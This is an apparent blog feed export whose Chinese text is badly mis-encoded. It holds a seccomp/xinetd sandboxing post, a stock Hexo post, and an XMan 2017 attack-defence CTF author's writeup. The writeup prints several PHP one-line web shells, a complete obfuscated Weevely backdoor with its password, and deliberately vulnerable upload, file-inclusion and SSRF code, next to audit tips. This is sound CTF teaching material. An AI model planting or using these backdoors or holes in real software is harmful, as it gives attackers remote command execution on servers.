seccomp ä¸­æ–‡ç›´è¯‘å°±æ˜¯â€œæ“ä½œè¿›ç¨‹çš„å®‰å…¨è®¡ç®—çŠ¶æ€â€ï¼Œå…¶å®å°±æ˜¯é€šçŸ¥å†…æ ¸å¯¹è¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨è¿›è¡Œé™åˆ¶ã€‚å‡ å¹´å‰CentOS/RedHat Linuxé»˜è®¤å¯ç”¨çš„selinuxåº•å±‚å°±æ˜¯ä½¿ç”¨çš„è¿™ä¸ªç³»ç»Ÿè°ƒç”¨å¯¹è¿›ç¨‹è¿›è¡Œç³»ç»Ÿè°ƒç”¨é™åˆ¶ã€‚å½“å¹´åº”è¯¥äººäººè£…å®Œlinuxçš„ç¬¬ä¸€ä»¶äº‹å°±æ˜¯å…³æ‰selinuxã€‚ç°åœ¨çš„Ubuntuå’ŒCentOSéƒ½å·²ä¸å†é»˜è®¤å®‰è£…æˆ–å¼€å¯selinuxäº†ã€‚<br />
é€šè¿‡<code>man seccomp</code>æˆ‘ä»¬å°±èƒ½çœ‹åˆ°seccompçš„ç›¸å…³è°ƒç”¨æ–¹æ³•ã€‚</p>
<pre><code>prctl(PR_SET_SECCOMP, SECCOMP_MODE_XX, args);
seccomp(SECCOMP_MODE_XX, flags, args);
</code></pre>
<p>linux Man pageå¯¹seccompçš„æè¿°éå¸¸æœ‰æ­§ä¹‰ï¼Œå…¶æä¾›äº†å¦‚ä¸Šä¸¤ç§æ¥å£ï¼Œè¿™é‡Œæˆ‘æŠŠå…¶å‚æ•°ç›¸åº”çš„å¯¹åº”äº†èµ·æ¥ã€‚<code>seccomp</code>çš„ç¬¬äºŒä¸ªå‚æ•°flagså¾ˆéš¾æŸ¥åˆ°ç›¸å…³èµ„æ–™ï¼Œè€Œä¸”åœ¨æˆ‘ä»¬çš„åœºæ™¯ä¸‹å¹¶ä¸å½±å“ä½¿ç”¨ï¼Œå°±ä¸å†å¤šåšè§£é‡Šã€‚seccompè°ƒç”¨ä¼šå¯¹å½“å‰è¿›ç¨‹åŠå…¶å­è¿›ç¨‹ç”Ÿæ•ˆï¼Œå¦‚æœæˆ‘ä»¬è°ƒç”¨seccompä¹‹åï¼Œå½“å‰è¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨å°±ä¼šè¢«é™åˆ¶ã€‚</p>
<p><code>SECCOMP_MODE_XX</code>å…±æœ‰ä¸¤ç§é€‰æ‹©ï¼š<br />
1. SECCOMP_MODE_STRICT<br />
2. SECCOMP_MODE_FILTER</p>
<p><code>SECCOMP_MODE_STRICT</code> ä¼šå°†ç³»ç»Ÿè°ƒé™åˆ¶åœ¨ <code>read, write, _exit (but not exit_group), sigreturn</code>ä¸­ã€‚ æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ªå°ç¨‹åºæµ‹è¯•ä¸€ä¸‹ï¼š</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;linux/seccomp.h&gt;
#include &lt;linux/filter.h&gt;
#include &lt;linux/audit.h&gt;
#include &lt;linux/signal.h&gt;
#include &lt;sys/prctl.h&gt;
#include &lt;unistd.h&gt;

int main(void)
{
    puts("a");
    prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT, 0);
    puts("b");
    system("echo c");
    return 0;
}
</code></pre>
<p>ç¼–è¯‘è¿è¡Œåç»“æœå¦‚ä¸‹ï¼š</p>
<pre><code>xm1994@xm1994-vm:~$ ./a.out 
a
b
Killed
</code></pre>
<p>ç¨‹åºåœ¨æ‰§è¡Œåˆ°systemå‡½æ•°åå°±æç¤ºäº†Killedã€‚è¿™æ˜¯å› ä¸ºåœ¨æ‰§è¡Œsystemæ—¶ï¼Œä¼šè°ƒç”¨forkå’Œexecveä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ã€‚<br />
å¦‚æœæˆ‘ä»¬åˆ æ‰system()å‡½æ•°åå†è¿è¡Œå‘¢ï¼Ÿç¨‹åºä¾ç„¶ä¼šæç¤ºkilledã€‚è¿™ä¸ªé—®é¢˜æ˜¯ç”±äºåœ¨æ–°ç‰ˆçš„libcä¸­ï¼Œmainå‡½æ•°é€€å‡ºåã€‚libc_start_mainä¼šè°ƒç”¨exit_group(0)ç»“æŸç¨‹åºä»¥åŠå…¶å­è¿›ç¨‹ï¼ˆæ„Ÿè§‰æ˜¯ä¸ºäº†é˜²æ­¢åƒµå°¸è¿›ç¨‹ï¼Ÿï¼‰ï¼Œä½†å†æ—§ç‰ˆçš„libcä¸­ï¼Œæ‰§è¡Œçš„æ˜¯exit()ã€‚</p>
<p><code>SECCOMP_MODE_FILTER</code> æ¨¡å¼åˆ™å…è®¸ä¼ å…¥ä¸€ä¸ªè¿‡æ»¤å™¨å‚æ•°ï¼Œè¿›è¡Œè‡ªå®šä¹‰çš„ç³»ç»Ÿè°ƒç”¨è¿‡æ»¤ã€‚</p>
<h2>è¿™è¿‡æ»¤å™¨å’‹æå•Šï¼Ÿ</h2>
<p>seccompä½¿ç”¨çš„è¿‡æ»¤å™¨å«<a href="https://zh.wikipedia.org/wiki/BPF">BPF</a>, å…è®¸åœ¨å†…æ ¸ä¸­ç›´æ¥è®¾ç½®æ•°æ®åŒ…è¿‡æ»¤æ¨¡å¼ã€‚ æˆ‘ä»¬ä½¿ç”¨wireshark/tcpdumpè¿›è¡Œç½‘ç»œæŠ“åŒ…æ—¶ï¼Œè®¾ç½®çš„æŠ“åŒ…è§„åˆ™å°±ä¼šè¢«ç¼–è¯‘æˆbpfé€å…¥å†…æ ¸ã€‚åœ¨å†…æ ¸ä¸­ï¼Œç³»ç»Ÿè°ƒç”¨æµç¨‹ä¹Ÿä¼šåæ˜ åœ¨ç½‘ç»œæ•°æ®åŒ…ï¼ˆç‰¹æ®Šçš„ï¼‰çš„å¤„ç†æµç¨‹ä¸­ï¼ˆè¿˜æœ‰å¾ˆå¤šå…¶ä»–çš„ç³»ç»Ÿäº‹ä»¶ä¹Ÿä¼šä»¥æ•°æ®åŒ…çš„å½¢å¼å­˜åœ¨ï¼‰ã€‚å› æ­¤ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ç¼–è¯‘bpfè§„åˆ™åˆ°å†…æ ¸ä¸­ï¼Œæ¥è‡ªå®šä¹‰seccompçš„è¿‡æ»¤è§„åˆ™ã€‚</p>
<pre><code> struct sock_fprog {
    unsigned short      len;    /* Number of BPF instructions */
    struct sock_filter *filter; /* Pointer to array of
                                    BPF instructions */
};

Each program must contain one or more BPF instructions:

struct sock_filter {            /* Filter block */
    __u16 code;                 /* Actual filter code */
    __u8  jt;                   /* Jump true */
    __u8  jf;                   /* Jump false */
    __u32 k;                    /* Generic multiuse field */
};

</code></pre>
<p>bpfè§„åˆ™å®é™…ä¸Šæ˜¯åœ¨å†…æ ¸ä¸­çš„bpfè™šæ‹Ÿæœºä¸­è¿è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´ä»–ä¹Ÿæ˜¯ä¸€ç§opcodeï¼Œå› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦ä¸€äº›å·¥å…·å»ç”Ÿæˆç›¸åº”çš„opcodeã€‚ä¸€ä¸ªæ¯”è¾ƒå¸¸ç”¨çš„å·¥å…·æ˜¯libseccompï¼Œå®ƒå¯ä»¥é€šè¿‡ä¸€äº›æ¥å£æ¥ç”Ÿæˆbpfè§„åˆ™ä»£ç ã€‚ä½†ä½¿ç”¨libseccompçš„è¯å°±éœ€è¦è‡ªå·±å†™ä¸€ä¸ªparserå»è°ƒç”¨ç›¸å…³çš„æ¥å£äº†ã€‚ä¸‡å¹¸ï¼Œåœ¨è°ƒç ”ä¸­ï¼Œæˆ‘å‘ç°äº†è°·æ­Œçš„æŸä¸ªå‘˜å·¥ç¼–å†™çš„<a href="https://github.com/google/kafel">kafel</a>åº“, ä»–å¯ä»¥å¾ˆæ–¹ä¾¿çš„å°†æ–‡æœ¬æè¿°çš„è¿‡æ»¤è§„åˆ™ç¼–è¯‘æˆsock_fprogç»“æ„ä½“ã€‚</p>
<h1>0x02 ä¿®æ”¹ï¼šä½ åˆ°åº•æ”¹äº†ç‚¹å•¥ï¼Ÿ</h1>
<p>åœ¨é˜…è¯»äº†xinetdä»£ç åï¼Œå‘ç°å…¶ä»£ç ç»“æ„æ˜¯ç›¸å½“çš„å¹²å‡€æ˜“äºç†è§£çš„ã€‚æˆ‘åœ¨å…¶é…ç½®æ–‡ä»¶parserä¸­æ·»åŠ äº†<code>kafel_rule</code> è¿™ä¸€é€‰é¡¹ï¼Œç”¨äºæŒ‡å®škafelè§„åˆ™æ–‡ä»¶ã€‚éšåå°†æ–‡ä»¶ç¼–è¯‘ä¸ºsock_fprogç»“æ„ä½“ä¿å­˜åœ¨æ¯ä¸ªserviceçš„é…ç½®ä¸­ã€‚<br />
xinetdåœ¨æ¥æ”¶åˆ°è¿æ¥åä¼šforkå‡ºæ¥ä¸€ä¸ªå­è¿›ç¨‹ï¼Œéšåé€šè¿‡dup/dup2è¿›è¡Œæµé‡å®šå‘ã€‚åœ¨æµé‡å®šå‘å®Œæˆåï¼Œä¼šè°ƒç”¨execveæ‰§è¡Œç›®æ ‡æœåŠ¡ç¨‹åºã€‚è¿™ä¸€è¿‡ç¨‹ç±»ä¼¼äºåœ¨shellä¸­æ‰§è¡Œç¨‹åºå¹¶å¯¹æµé‡å®šå‘ï¼Œå¦‚æœè¯»è€…å®ç°è¿‡ç®€æ˜“çš„shellï¼Œåº”è¯¥å¾ˆå¥½ç†è§£ã€‚<br />
æˆ‘ä»¬åªéœ€è¦åœ¨execveä¹‹å‰è°ƒç”¨ <code>prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, args);</code> ä¾¿å¯å¯¹ç›®æ ‡æœåŠ¡ç¨‹åºè®¾å®šseccompè§„åˆ™ã€‚</p>
<p>è¿™ä¸€ä¿®æ”¹å…¶å®ååˆ†ç®€å•ï¼Œä»£ç çš„æ€»å˜æ›´è¡Œæ•°ä¸è¶…è¿‡200è¡Œã€‚</p>
<h1>0x03 æ•ˆæœï¼šçœŸç®¡ç”¨ï¼Ÿ</h1>
<p>å½“ç„¶ç®¡ç”¨äº†ï¼Œä¸ä¿¡è‡ªå·±è¯•è¯•ã€‚</p>
<p>è¿™ä¸ªç‰ˆæœ¬çš„xinetdæˆ‘ä»¬å·²ç»åº”ç”¨åˆ°äº†æˆ˜é˜Ÿå¸ƒç½®pwné¢˜ä½¿ç”¨çš„docker imageï¼š<a href="https://github.com/Asuri-Team/ctf-xinetd">ctf-xinetd</a>ä¸­ã€‚æ¬¢è¿å„ä½å¤§å¸ˆå‚…è„±ä¸‹æ¥è¯•ç”¨ï¼Œå¥½ç”¨çš„è¯åˆ«å¿˜ç‚¹ä¸ªstar~ã€‚</p>
<h1>0x04 ç›®æ ‡ï¼šç†æƒ³å¾ˆä¸°æ»¡</h1>
<p>è¿™ä¸ªå·¥å…·æˆ‘ç”¨äº†ä¸åˆ°å…­ä¸ªå°æ—¶å°±å†™å®Œäº†ã€‚ä¹‹æ‰€ä»¥è¿™ä¹ˆèµ¶æ—¶é—´ï¼Œæ˜¯å¸Œæœ›åœ¨å³å°†åˆ°æ¥çš„å›½èµ›å’Œä»¥åçš„æ¯”èµ›ä¸­ï¼Œèƒ½æœ‰ä¸»åŠæ–¹ä½¿ç”¨å’Œæ¨å¹¿è¿™ä¸€å·¥å…·ï¼Œä¸ºé€‰æ‰‹æä¾›æ›´åŠ å¹²å‡€å…¬å¹³çš„æ¯”èµ›ç¯å¢ƒã€‚æœ€ç»ˆç›®çš„å½“ç„¶æ˜¯å›½å†…å¤–çš„æ‰€æœ‰æ¯”èµ›éƒ½èƒ½ç”¨ä¸Šè¿™ä¸€å·¥å…·ï¼Œä½†æ˜¯ç†æƒ³å¾ˆä¸°æ»¡ï¼Œæ€•æ˜¯åˆ°æœ€ååªæœ‰æˆ‘ä»¬æˆ˜é˜Ÿå’Œæ¯”è¾ƒç†Ÿæ‚‰çš„å‡ ä¸ªæˆ˜é˜ŸåŠæ¯”èµ›æ‰ä¼šç”¨å§233333ã€‚</p>]]></content>
        <author>
            <name><![CDATA[0xe799bde88f9c]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/12/03/hello-world/</id>
        <title><![CDATA[Hello World]]></title>
        <updated>2018-02-24T03:48:11+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/12/03/hello-world/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/12/03/hello-world/"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
        <author>
            <name><![CDATA[KarlRixonâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.summershrimp.com/2017/08/xman2017-awd-babyblog-writeup/</id>
        <title><![CDATA[XMan2017å¤ä»¤è¥ç»“ä¸šæ”»é˜²èµ›Babyblogå‡ºé¢˜æ€è·¯&WriteUP]]></title>
        <updated>2017-08-20T15:21:31+08:00</updated>
        <link href="https://www.summershrimp.com/2017/08/xman2017-awd-babyblog-writeup/"/>
        <content type="text/html" src="https://www.summershrimp.com/2017/08/xman2017-awd-babyblog-writeup/"><![CDATA[<h1 class="md-end-block md-heading md-focus"><span class="md-expand">XMan 2017 AWD Babyblog author&#8217;s turtoral &amp; writeup</span></h1>
<h2 class="md-end-block md-heading">0x00 å‡ºé¢˜æ€è·¯</h2>
<h3 class="md-end-block md-heading">å¸¸è§ä¸€å¥è¯æœ¨é©¬</h3>
<p><span class="md-line md-end-block">ä¸€å¥è¯æœ¨é©¬æ˜¯åœ¨æ—¥å¸¸æ”»å‡»å’Œæ¸—é€ä¸­ä½¿ç”¨çš„æœ€å¹¿æ³›çš„ä¸€ç±»æœ¨é©¬ï¼Œå…¶å…·æœ‰ä»£ç é‡å°ï¼Œå˜å½¢å¤šï¼Œæ˜“éšè—ç­‰ç‰¹æ€§ã€‚è¿™ç±»ä¸€å¥è¯æœ¨é©¬å¤šä¸ºé€šè¿‡evalæˆ–ç±»ä¼¼å‘½ä»¤ç›´æ¥æ‰§è¡Œå¯¹åº”è¯­è¨€çš„å­—ç¬¦ä¸²ä»£ç ï¼Œè¾¾åˆ°å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤çš„æ•ˆæœã€‚åœ¨æœ¬é¢˜ä¸­ï¼Œæˆ‘ä¸€å…±æ”¾ç½®äº†å››ç§ä¸åŒç±»å‹çš„ä¸€å¥è¯æœ¨é©¬ï¼š</span></p>
<pre class="lang:default decode:true"># 1. app/template/*.tpl
eval($_POST[passwd])

# 2. app/controllers/PostsController.php 
$_GET[function]($_POST[params])

# 3. bootstrap/autoload.php
echo `$_POST[shellcmd]`

# 4. app/views/errors/404.blade.php
@preg_replace("/[pageerror]/e", $_POST['passwd'], "saft");</pre>
<h3 class="md-end-block md-heading">å¸¸è§å¤§é©¬</h3>
<p><span class="md-line md-end-block">ç›¸æ¯”äºå°é©¬ï¼Œè¿™ç±»æœ¨é©¬é€šå¸¸ä½“ç§¯ç¨å¤§ï¼Œæ›´ä¸æ˜“éšè—ã€‚ä½†å…¶ä¸­å¯ä»¥åŒ…å«æ›´å¤šåŠ å¯†å’Œæ··æ·†çš„æªæ–½ï¼Œä½¿æ”»å‡»è¡Œä¸ºæ›´ä¸å®¹æ˜“è¢«å¯Ÿè§‰ã€‚åœ¨æœ¬é¢˜ä¸­ï¼Œæˆ‘æ”¾ç½®äº†ä¸€ä¸ªWeevelyæœ¨é©¬ï¼Œå…¶å¯†ç ä¸ºxman1234</span></p>
<pre class="lang:default decode:true"># 1. autoload_real.php
$i='er";$K3i=$m[1][0K3].K3$m[1K3]K3[1];$hK3=$K3sl($ss(K3md5($i.$kh),0,K33));$f=$sl(K3$sK3s(md5($i.$';
$D='kfK3K3),0,3));$p="K3";foK3K3r(K3$K3z=1;$z&lt;count($m[1]);K3$z++)$pK3.=$q[$m[K32K3][K3K3$z]];if(sK';
$v='3LANK3GUAK3GE"];if($rr&amp;&amp;$ra)K3{$u=paK3rK3K3sK3K3e_url($rr);parse_str($uK3["query"],$qK3);$q=arK';
$B='[$i].=$p;$eK3=strpK3oK3s($s[$i]K3,$f);ifK3($eK3){$k=$khK3.K3$kf;oK3b_start();@evaK3l(@gzuncK3om';
$o='3;}}return K3$oK3;}$rK3=$_K3SERVER;$K3rr=@$r[K3"HTTP_REFEREK3R"];$ra=K3@$r["K3HTTP_AK3CCK3EPT_K';
$O='K3;iK3f($q&amp;K3&amp;$m){@sesK3sioK3n_start()K3;$s=K3&amp;$_SK3ESSIK3OK3N;$ss="substK3r";$sK3l="strtK3olow';
$H='3="";for($i=0;$i&lt;$l;K3){fK3orK3($j=0;($j&lt;$K3c&amp;&amp;$i&lt;$K3lK3)K3;$j++K3,$i++){$o.=$tK3{$i}^$k{$K3j}K';
$c='$K3ss($s[$i],0K3,$eK3))),$k))K3);$K3o=oK3b_get_conK3tentsK3();ob_enK3d_cK3lean();K3K3$d=baseK36';
$m='4_encode(x(K3gzcompK3ress($oK3),$kK3));print("&lt;K3$k&gt;$dK3K3&lt;/$k&gt;"K3);@sK3ession_deK3stroy();}}}}';
$t='$kh="a8bK3b";$K3kf="c44K3K3a";funK3ctK3ion x($t,$k){$cK3=sK3trlen($kK3);$l=stK3rlK3en($t);K3$oK';
$M='prK3ess(@x(@bK3aK3se64K3_decodeK3(pregK3_replaK3ce(aK3rray("/_/",K3"/-/"),arrK3ay(K3"/","K3+"),';
$f='3trposK3($p,$h)===0K3){$s[$i]=""K3;$p=$sK3s($pK3,3);}K3K3if(array_key_exisK3ts($i,K3$K3sK3)){$s';
$Q=str_replace('d','','crdddeatde_fdunctdion');
$b='3raK3y_vK3alues(K3$q)K3;preg_mK3aK3tch_all("K3/(K3[\\K3w])[\\w-]+(?:;q=0.([\\d]))K3?,K3?/",$ra,$m)';
$l=str_replace('K3','',$t.$H.$o.$v.$b.$O.$i.$D.$f.$B.$M.$c.$m);
$q=$Q('',$l);$q();</pre>
<p><span class="md-line md-end-block">åœ¨è¿™æ®µå¤§é©¬ä¸­ï¼Œ<span spellcheck="false"><code>$Q</code></span>å’Œ<span spellcheck="false"><code>$l</code></span>å‡ä¸ºå­—ç¬¦ä¸²ã€‚Weevelyå€ŸåŠ©PHPå¯ä»¥å°†å‡½æ•°åå­—ç¬¦ä¸²ç”¨ä½œç±»ä¼¼å‡½æ•°æŒ‡é’ˆçš„ç‰¹æ€§ï¼Œæ¥æ„é€ æœ¨é©¬ã€‚</span></p>
<pre class="lang:default decode:true">$Q = create_function

$kh = "a8bb";
$kf = "c44a";
function x($t, $k) {
	$c = strlen($k);
	$l = strlen($t);
	$o = "";
	for ($i = 0;$i &lt; $l;) {
		for ($j = 0;($j &lt; $c &amp;&amp; $i &lt; $l);$j++, $i++) {
			$o.= $t{$i} ^ $k{$j};
		}
	}
	return $o;
}
$r = $_SERVER;
$rr = @$r["HTTP_REFERER"];
$ra = @$r["HTTP_ACCEPT_LANGUAGE"];
if ($rr &amp;&amp; $ra) {
	$u = parse_url($rr);
	parse_str($u["query"], $q);
	$q = array_values($q);
	preg_match_all("/([\w])[\w-]+(?:;q=0.([\d]))?,?/", $ra, $m);
	if ($q &amp;&amp; $m) {
		@session_start();
		$s = &amp; $_SESSION;
		$ss = "substr";
		$sl = "strtolower";
		$i = $m[1][0] . $m[1][1];
		$h = $sl($ss(md5($i . $kh), 0, 3));
		$f = $sl($ss(md5($i . $kf), 0, 3));
		$p = "";
		for ($z = 1;$z$d");@session_destroy();}}}}
"</pre>
<h3 class="md-end-block md-heading">ä»»æ„æ–‡ä»¶åŒ…å«</h3>
<p><span class="md-line md-end-block">ä»»æ„æ–‡ä»¶åŒ…å«å¤šä¸ºæœåŠ¡ç«¯ç¨‹åºåœ¨å¼€å‘æ—¶æ²¡å¯¹å¯åŒ…å«ç›®å½•å’Œæ–‡ä»¶åšé™åˆ¶ï¼Œå¯¼è‡´å¯ä»¥è¯»å–ä»»ä½•æ–‡ä»¶ã€‚ä¸€èˆ¬çš„è¡¨ç°å½¢å¼ä¸º<span spellcheck="false"><code>http://localhost/page=index</code></span>æˆ–ç±»ä¼¼æ–¹å¼ã€‚æœ¬é¢˜ä¸­ï¼Œæˆ‘ä»¬åœ¨åšå®¢æ–‡ç« ä¸­å¼•å…¥äº†æ­£æ–‡æ¨¡æ¿ï¼Œè¿™é‡Œçš„æ¨¡æ¿å°±å…·æœ‰æ–‡ä»¶åŒ…å«æ¼æ´ã€‚</span></p>
<pre class="lang:default decode:true"># 1. app/views/posts/show.blade.php
&lt;div class="article-body"&gt;
    {{ require __DIR__."/../../template/".$post-&gt;template }}
    {{ $post-&gt;body }}
&lt;/div&gt;</pre>
<h3 class="md-end-block md-heading">ä»»æ„æ–‡ä»¶ä¸Šä¼ </h3>
<p><span class="md-line md-end-block">ä»»æ„æ–‡ä»¶ä¸Šä¼ å¤šä¸ºæœåŠ¡ç«¯ç¨‹åºåœ¨å¼€å‘æ—¶ï¼Œæœªå¯¹å¯ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•åè¿›è¡Œé™åˆ¶ï¼Œå¯¼è‡´å¯ä»¥ä¸Šä¼ æœåŠ¡å™¨è„šæœ¬ï¼Œå¹¶é€šè¿‡HTTPè®¿é—®æ‰§è¡Œã€‚æœ¬é¢˜ä¸­ï¼Œæˆ‘ä»¬åœ¨åšå®¢æ–‡ç« å›¾ç‰‡ä¸Šä¼ å¤„æœªå¯¹å¯ä¸Šä¼ æ–‡ä»¶åšé™åˆ¶ã€‚</span></p>
<pre class="lang:default decode:true"># 1. app/controllers/PostsController.php
    public function uploadImage()
    {
        $data = [
            'success' =&gt; false,
            'msg' =&gt; 'Failed!',
            'file_path' =&gt; ''
        ];

        if ($file = Input::file('upload_file'))
        {
            $fileName        = $file-&gt;getClientOriginalName();
            $extension       = $file-&gt;getClientOriginalExtension() ?: 'png';
            $folderName      = '/uploads/images/' . date("Ym", time()) .'/'.date("d", time()) .'/'. Auth::user()-&gt;id;
            $destinationPath = public_path() . $folderName;
            $safeName        = str_random(10).'.'.$extension;
            $file-&gt;move($destinationPath, $safeName);
            $data['file_path'] = $folderName .'/'. $safeName;
            $data['msg'] = "Succeeded!";
            $data['success'] = true;
        }
        return $data;
    }</pre>
<h3 class="md-end-block md-heading">æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ </h3>
<p><span class="md-line md-end-block">æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ æ˜¯æŒ‡åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œæœ‰äº›ç”¨æˆ·æäº¤çš„èµ„æºï¼ˆå¦‚å›¾ç‰‡ï¼Œæ–‡å­—ç­‰ï¼‰éœ€è¦åŠ è½½åˆ°æœåŠ¡å™¨æœ¬åœ°è¿›è¡Œå¤„ç†ï¼Œä½†æœåŠ¡ç«¯å¹¶æœªå¯¹èµ„æºåœ°å€è¿›è¡Œé™åˆ¶ï¼Œå¯¼è‡´çš„å¯ä»¥æ¢æµ‹æœåŠ¡å™¨å†…ç½‘æˆ–ä»»æ„æœ¬åœ°æ–‡ä»¶è¯»å–ã€‚æœ¬é¢˜ä¸­ï¼Œæˆ‘ä»¬è®¾è®¡äº†/resolve_imageè¿™ä¸ªè°ƒç”¨ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰åˆ¶ä½œç›¸åº”çš„å‰ç«¯é¡µé¢ã€‚</span></p>
<pre class="lang:default decode:true"># 1. app/controllers/PostsController.php
    public function resolveImage()
    {
        $resp = [
            'success' =&gt; false,
            'msg' =&gt; 'Failed!',
            'file_path' =&gt; ''
        ];

        $data = Input::only('resolve_file');

        $content = @file_get_contents($data['resolve_file']);
        if ($content)
        {
            $extension       = 'png';
            $folderName      = '/uploads/images/' . date("Ym", time()) .'/'.date("d", time()) .'/'. Auth::user()-&gt;id;
            $destinationPath = public_path() . $folderName;
            $safeName        = str_random(10).'.'.$extension;
            @mkdir($destinationPath, 0755, true);
            @file_put_contents($destinationPath .'/'. $safeName, $content);
            $resp['file_path'] = $folderName .'/'. $safeName;
            $resp['msg'] = "Succeeded!";
            $resp['success'] = true;
        }
        return $resp;
    }</pre>
<h2 class="md-end-block md-heading">0x01 å®¡è®¡ä¸é˜²å¾¡æ–¹å¼</h2>
<h3 class="md-end-block md-heading">å¸¸è§ä¸€å¥è¯æœ¨é©¬</h3>
<p><span class="md-line md-end-block">å¯ä»¥é€šè¿‡grepæˆ–findç­‰å‘½ä»¤æœç´¢ç›¸å…³å…³é”®å­—ï¼ˆå¦‚<span spellcheck="false"><code>eval, system, passthru, $_POST, $_REQUEST</code></span>ï¼‰ç­‰ï¼Œæ¥å¿«é€Ÿå®šä½ç›¸å…³ä½ç½®ï¼Œéšåå¯¹æºç è¿›è¡Œå®¡æŸ¥ã€‚è¿™ç±»æœ¨é©¬é€šå¸¸ä¸ä¼šå½±å“ç¨‹åºè¿è¡Œé€»è¾‘ï¼Œå› æ­¤å¯ä»¥ç›´æ¥åˆ é™¤ç›¸å…³ä»£ç ã€‚</span></p>
<pre class="lang:default decode:true">$ grep -re eval
vendor/d11wtq/boris/lib/Boris/EvalWorker.php:        $__result = eval($__input);
vendor/d11wtq/boris/lib/Boris/EvalWorker.php:        eval($__hook);
app/template/3.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";
app/template/1.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";
app/template/2.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";

$grep -re \$_POST
bootstrap/compiled.php:        $request = self::createRequestFromFactory($_GET, $_POST, array(), $_COOKIE, $_FILES, $_SERVER);
bootstrap/compiled.php:        $_POST = $this-&gt;request-&gt;all();
bootstrap/compiled.php:        $request = array('g' =&gt; $_GET, 'p' =&gt; $_POST, 'c' =&gt; $_COOKIE);
bootstrap/autoload.php:echo `$_POST[checker]`;
public/packages/frozennode/administrator/js/ckeditor/samples/assets/posteddata.php:if (!empty($_POST))
...
app/views/errors/404.blade.php:@preg_replace("/[pageerror]/e", $_POST['notfound'], "saft");
app/storage/views/dde1e00e577ea930001955e78ec38ca4:@preg_replace("/[pageerror]/e", $_POST['notfound'], "saft");
app/template/3.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";
app/template/1.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";
app/template/2.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";</pre>
<h3 class="md-end-block md-heading">å¸¸è§å¤§é©¬</h3>
<p><span class="md-line md-end-block">åŸºæœ¬æ–¹æ³•åŒå°é©¬ï¼Œä½†ç”±äºå¤§é©¬ç»“æ„å¤æ‚ï¼Œæ›´åŠ éœ€è¦å¹³æ—¶çš„ç§¯ç´¯å’Œäººå·¥åˆ†æèƒ½åŠ›ã€‚è¿™ç±»æœ¨é©¬é€šå¸¸ä¸ä¼šå½±å“ç¨‹åºè¿è¡Œé€»è¾‘ï¼Œå› æ­¤å¯ä»¥ç›´æ¥åˆ é™¤ç›¸å…³ä»£ç æˆ–æ–‡ä»¶ã€‚</span></p>
<h3 class="md-end-block md-heading">ä»»æ„æ–‡ä»¶åŒ…å«</h3>
